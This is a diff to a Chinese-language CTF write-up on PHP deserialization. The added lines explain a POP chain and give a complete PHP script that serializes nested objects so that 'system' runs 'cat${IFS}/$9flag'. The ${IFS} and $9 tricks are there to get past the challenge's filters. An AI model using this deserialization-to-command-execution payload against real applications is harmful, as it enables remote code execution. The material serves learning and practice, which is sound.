@@ -64,14 +64,58 @@
 
 <br>
 
-**在终点处，**
-
-v3 = [0]*18意思为定义一个长度为18的列表
+<img src="https://54huarui.github.io/blogs/unisjpg/un6.png" width="880" height="480">
 
 <br>
 
+**在终点处，我们可以给$eva1和$interesting传参。其中$eva1为函数,$interesting为参数**
 
 
 <br>
 
-**特别注意！！！**
+**经过学长的帮助和多次尝试，终于确定了这里最终的命令public $eva1="system"; public $interesting="cat\${IFS}/$9flag";**
+
+<br>
+
+**全部playload如下**
+
+<br>
+
+<?php
+
+class syc
+{
+    public $cuit;
+
+}
+
+class lover
+{
+    public $yxx;
+    public $QW;
+
+
+}
+
+class web
+{
+    public $eva1="system";
+    public $interesting="cat\${IFS}/$9flag";
+
+
+}
+
+$a=new syc;
+$b=new lover;
+$c=new web;
+
+
+$a->cuit=$b;
+$b->yxx=$c;
+
+echo urlencode(serialize($a));
+
+
+?>
+
+<br>
